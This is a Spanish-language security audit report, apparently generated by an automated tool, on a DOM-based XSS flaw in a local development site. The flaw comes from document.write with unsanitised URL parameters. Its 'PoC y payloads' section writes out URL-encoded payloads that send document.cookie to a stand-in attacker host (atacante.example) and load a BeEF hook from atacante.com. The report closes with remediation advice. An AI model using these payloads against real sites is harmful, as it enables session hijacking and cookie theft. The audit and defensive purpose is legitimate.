# Informe de Auditoría XSS - web.dev.local:8082

Resumen ejecutivo:
- URL objetivo: http://web.dev.local:8082
- Vector identificado: DOM-based XSS via parámetros URL (search, name, comment) que son escritos en el DOM mediante document.write sin saneamiento.

Hallazgo:
- VULN: DOM-based Cross-Site Scripting (XSS) detectado.
- Parámetros implicados: search (búsqueda), name, comment (formulario de comentarios).
- Confirmación manual: el código cliente incluye bloques como:
  - document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
  - document.write('<div class="comment-author">' + c.name + '</div>');
  - document.write('<div>' + c.comment + '</div>');
  Estos concatenan directamente valores controlables por el usuario (URLSearchParams / localStorage) sin escapar.

Comandos y pruebas realizadas (registradas):
- Reconocimiento y pruebas básicas con curl:
  - curl -s -D - http://web.dev.local:8082 -o /tmp/home.html
  - curl -s "http://web.dev.local:8082/?q=<script>alert(1)</script>" -o /tmp/resp_q.html
  - curl -s -H "User-Agent: <script>alert(1)</script>" -H "Referer: <script>alert(1)</script>" http://web.dev.local:8082/ -o /tmp/resp_headers.html
  - Varias peticiones GET probando parámetros comunes (q, search, query, name, comment, etc.) y guardado de respuestas en /tmp/resp_*.html
- Inspección manual del HTML/JS (se encontró uso de document.write y lectura directa de URLSearchParams y localStorage).

PoC y payloads (demostración manual y de explotación):
- Payload sencillo de prueba (Reflected/DOM):
  - ?search=<script>alert(1)</script>
  - En el navegador, al navegar a: http://web.dev.local:8082/?search=<script>alert(1)</script>
    el código cliente inserta el valor de searchTerm con document.write provocando ejecución de JS.

- Payload de explotación (robo de cookie hacia servidor atacante):
  - ?search=%3Cscript%3E(new%20Image()).src%3D%22https%3A%2F%2Fatacante.example%2F%3Fc%3D%22%2BencodeURIComponent(document.cookie)%3C%2Fscript%3E
  - Ofuscación alternativa usando onerror de imagen para evadir filtros: ?name=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27https%3A%2F%2Fatacante.example%2F%3Fc%3D%27+encodeURIComponent(document.cookie))%22%3E
  - Simulación de hook BeEF: ?search=%3Cscript%20src%3D%22http%3A%2F%2Fatacante.com%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E

Evidencia de contexto (capturas locales):
- /tmp/resp_q.html contiene el HTML con los scripts que hacen document.write usando URLSearchParams.
- Las pruebas con curl no muestran ejecución JS (curl no ejecuta JS). La confirmación definitiva requiere un navegador o motor JS que ejecute el código cliente.

Impacto:
- DOM XSS permite ejecución de código arbitrario en el navegador de la víctima bajo el dominio legítimo: robo de cookies, tokens en localStorage/sessionStorage, ejecución de acciones en nombre del usuario y posible persistencia en localStorage (comentarios guardados) que afectaría a futuros visitantes del mismo navegador.

Recomendaciones:
1. Evitar document.write() para insertar contenido dinámico; usar textContent / createTextNode para insertar texto escapado.
2. Escapar y sanitizar cualquier dato procedente de URLSearchParams o localStorage antes de insertarlo en el DOM.
3. Para contenido HTML permitida, usar listas blancas y sanitizadores del lado cliente y servidor (DOMPurify, etc.)
4. Si se guardan comentarios en el almacenamiento local, serializar y escapar al mostrar.

Notas:
- Se intentaron herramientas automáticas (dalfox, xsstrike) en el entorno, pero no estaban disponibles en el servidor remoto.
- Se intentó automatizar explotación con Puppeteer, pero la instalación y ejecución automática en este entorno no completó correctamente durante la auditoría automatizada (se documentaron intentos).

Conclusión:
- Existe una vulnerabilidad DOM-based XSS en la aplicación en http://web.dev.local:8082 que puede explotarse inyectando scripts en parámetros URL como search, name y comment.
- Recomendado: corregir el manejo de entrada y desplegar mitigaciones de escape/sanitización urgentemente.

Informe generado automáticamente el 2026-04-25T14:26:43Z por auditor automático.
